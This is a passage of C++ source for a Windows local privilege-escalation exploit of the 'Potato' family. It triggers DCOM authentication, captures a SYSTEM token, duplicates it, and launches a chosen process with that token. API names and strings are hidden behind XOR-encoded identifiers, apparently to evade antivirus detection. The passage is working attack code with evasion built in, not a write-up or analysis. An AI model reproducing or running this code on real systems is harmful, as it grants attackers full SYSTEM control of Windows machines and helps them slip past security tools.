char k_VDFqDJeQzRWK = '\x45';
for(int i = 0; i < sizeof(hid_OpenPr_0B4cmIDjEomW) / sizeof(hid_OpenPr_0B4cmIDjEomW[0]); i++){
hid_OpenPr_0B4cmIDjEomW[i] = hid_OpenPr_0B4cmIDjEomW[i] ^ k_VDFqDJeQzRWK;
}

	_OpenProcessToken hid_OpenPr_XyihfRjZJcD3 = (_OpenProcessToken) GetProcAddress(hid_hHandl_L43qnoSLRpWK, hid_OpenPr_0B4cmIDjEomW);
PotatoAPI* test = new PotatoAPI();
	test->startCOMListenerThread();

	if (clsid != NULL)
		olestr = clsid;

	if (!TEST_mode)
		printf(hid_Testin_gmnjnxoQjPKP, olestr, g_port);


	test->startRPCConnectionThread();
	test->triggerDCOM();

	BOOL result = false;

	int ret = 0;
	while (true) {

		if (test->negotiator->authResult != -1)
		{

			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;
			SECURITY_DESCRIPTOR sdSecurityDescriptor;
			if (!TEST_mode)
				printf(hid______a_sudj1JfJRrxN, test->negotiator->authResult);

			fflush(stdout);

			// Get a token for this process. 
			if (!hid_OpenPr_XyihfRjZJcD3(GetCurrentProcess(),
				TOKEN_ALL_ACCESS, &hToken))return 0;

			//enable privileges
			EnablePriv(hToken, hid_S_e_I__dXLLZSxlTvqz);
			EnablePriv(hToken, hid_S_e_A__hA5dzs9mABHd);
			PTOKEN_TYPE ptg;
			DWORD dwl = 0;
			HANDLE hProcessToken;
			hid_OpenPr_g36DUBmjbP0v(GetCurrentProcess(), TOKEN_ALL_ACCESS,
				&hProcessToken);

			hid_QueryS_fJ8A9qL5leI5(test->negotiator->phContext, &elevated_token);
			IsTokenSystem(elevated_token);
			if (TEST_mode)
				return 1;

			hid_GetTok_DcSJLJNPSx4y(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf(hid_____Er_17szv2p6MYWZ, GetLastError());

			result = hid_Duplic_7GHdI80ocpw6(elevated_token,
				TOKEN_ALL_ACCESS,
				NULL,
				SecurityImpersonation,
				TokenPrimary,
				&duped_token);


			hid_GetTok_voHqeSwStO7O(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf(hid_Error__sbtsKiRnM3y2, GetLastError());

			DWORD SessionId;
			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			SECURITY_ATTRIBUTES sa;

			ZeroMemory(&si, sizeof(STARTUPINFO));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);
			si.lpDesktop = L"winsta0\\default";

			DWORD sessionId = WTSGetActiveConsoleSessionId();

			fflush(stdout);
			wchar_t command[256];
			wcscpy(command, processname);

			if (processargs != NULL)
			{
				wcsncat(command, L" ", 1);
				wcsncat(command, processargs, wcslen(processargs));
			}

			if (*processtype == 't' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = hid_Create_h1pqYZd3ouoQ(duped_token,
					0,
					processname,
					command,
					0,
					NULL,
					NULL,
					&si,
					&pi);

				if (!result)
				{
					printf(hid______C_qRMUVNAEJ984, GetLastError());
				}
				else
				{
					printf(hid______C_cKDdakTdj5u3);
					break;
				}
			} 

			if (*processtype == 'u' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = hid_Create_tZgaAp9sT5ro(
					duped_token,
					processname,
					command,
					nullptr, nullptr,
					FALSE, 0, nullptr,
					hid_C______1JskXen3QT1I, &si, &pi
				);

				if (!result) {
					printf(hid______C_DLTN97J7N3Ac, GetLastError());
				}
				else {
					printf(hid______C_e01ZaE39NbvN);
					break;
				}
			}//end argv

			if (!result)
				break;
			else {
				printf(hid_Waitin_mLkGuPKnKXIo);
				Sleep(500);
				fflush(stdout);
			}
		}//end auth
	}
	return result;
}
